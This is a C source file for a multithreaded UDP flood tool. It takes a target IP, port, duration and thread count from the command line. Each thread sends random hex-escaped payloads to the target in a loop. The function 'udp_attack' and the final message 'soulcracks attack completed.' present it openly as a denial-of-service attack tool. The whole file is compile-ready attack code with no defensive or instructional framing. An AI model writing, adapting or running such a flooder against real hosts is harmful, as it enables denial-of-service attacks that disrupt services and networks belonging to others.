#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>

#define PACKET_SIZE 15000
#define PAYLOAD_SIZE 20


void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

void *udp_attack(void *args) {
    char **argv = (char **)args;
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    
    struct sockaddr_in server_addr;
    int sock;
    char buffer[PAYLOAD_SIZE * 4 + 1]; 

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        printf("Error: Could not create socket! Reason: %s\n", strerror(errno));
        pthread_exit(NULL);
    }


    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);


    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        printf("Error: Invalid IP address - %s\n", target_ip);
        close(sock);
        pthread_exit(NULL);
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {

        generate_payload(buffer, PAYLOAD_SIZE);

        if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            printf("Error sending packet: %s\n", strerror(errno));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    int threads_count = atoi(argv[4]);
    pthread_t threads[threads_count];

    for (int i = 0; i < threads_count; i++) {
        if (pthread_create(&threads[i], NULL, udp_attack, (void*)argv)) {
            printf("Error: Could not create thread %d. Reason: %s\n", i, strerror(errno));
            return 1;
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("soulcracks attack completed.\n");
    return 0;
}